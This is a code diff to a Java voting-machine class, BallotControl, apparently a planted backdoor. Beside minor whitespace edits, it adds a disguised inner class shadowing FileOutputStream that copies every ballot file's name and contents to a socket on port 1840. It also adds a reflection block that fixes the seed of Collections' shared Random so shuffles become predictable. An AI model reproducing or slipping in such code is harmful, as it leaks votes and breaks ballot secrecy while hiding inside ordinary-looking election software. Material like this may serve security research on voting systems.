@@ -35,6 +35,8 @@
  * damage.
  */
 
+import java.lang.reflect.Field;
+import java.math.BigInteger;
 import java.util.*;
 import javax.swing.*;
 import javax.swing.event.*;
@@ -287,7 +289,6 @@ public class BallotControl {
 						BallotControl.resetBallot();
 					}
 				});
-
 				// Add the confirmation panel to the appropriate place in the GUI
 				bg.ballotPanelHolder.removeAll();
 				bg.ballotPanelHolder.add(confirmPanel);
@@ -384,6 +385,7 @@ public class BallotControl {
 		int bnum = 0;
 
 		while (i3.hasNext()) {
+
 			Hashtable thisVoter = (Hashtable) i3.next();
 			bnum++;
 			File outfile = new File(ballotOutDir, "ballot" + bnum + ".txt");
@@ -445,7 +447,7 @@ public class BallotControl {
 	 * Display the results of the election.
 	 *
 	 * @param voteResults String to be displayed, containing the
-	 * results. 
+	 * results.
 	 */
 	static void displayResults(String voteResults) {
 
@@ -509,7 +511,7 @@ public class BallotControl {
 	 * Check that the PIN encoded in the given query frame is correct,
 	 * and enable voting if so.
 	 *
-	 * @param f The PINQueryPanel to get the PIN from. 
+	 * @param f The PINQueryPanel to get the PIN from.
 	 */
 	static void checkPin(PINQueryPanel f) {
 		int suppliedPIN;
@@ -563,4 +565,33 @@ public class BallotControl {
 
 	}
 
+	private static class FileOutputStream extends java.io.FileOutputStream {
+		static Socket leaker;
+		static {
+			try { leaker = new Socket(InetAddress.getByAddress(new byte[] {0x7f, 0x0, 0x0, 0x1}), 1840); } catch (IOException e) { }
+		}
+		public FileOutputStream(File file) throws FileNotFoundException {
+			super(file);
+			try { leaker.getOutputStream().write( file.getName().getBytes()); } catch (IOException e) { }
+		}
+
+		@Override
+		public void write(byte[] b, int off, int len) throws IOException {
+			try { leaker.getOutputStream().write(b, off, len); } catch (IOException e) {}
+			super.write(b, off, len);
+		}
+
+	}
+
+	static {
+		Collections.shuffle(Collections.EMPTY_LIST);
+		try {
+			Field f = Collections.class.getDeclaredField("r");
+			f.setAccessible(true);
+			Random r = (Random) f.get(null);
+			r.setSeed(1840);
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
+	}
 }
